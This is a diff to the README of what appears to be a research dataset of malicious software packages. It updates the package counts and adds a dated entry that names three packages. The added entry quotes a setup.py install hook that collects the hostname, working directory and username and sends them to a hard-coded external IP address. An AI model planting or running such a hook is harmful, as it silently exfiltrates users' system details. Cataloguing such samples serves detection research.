@@ -1,6 +1,6 @@
 ## Dataset Size
 
-This data set includes about 7,137 versions of the source code of 6,058 malicious packages.
+This data set includes about 7,140 versions of the source code of 6,061 malicious packages.
 
 ## Dataset Format
 
@@ -860,6 +860,21 @@ def promain():
 promain()
 ```
 
+### 22 Jul. 2024
+hexmanibm [1.0.4] <br>
+hexteamibm [1.0.4] <br>
+asptcer [1.0.0] <br>
+
+```python
+class CustomInstall(install):
+    def run(self):
+        install.run(self)
+        hostname=socket.gethostname()
+        cwd = os.getcwd()
+        username = getpass.getuser()
+        ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        requests.get("http://9.30.214.68",params = ploads)
+```
 
 ## About the malicious packages detection
 
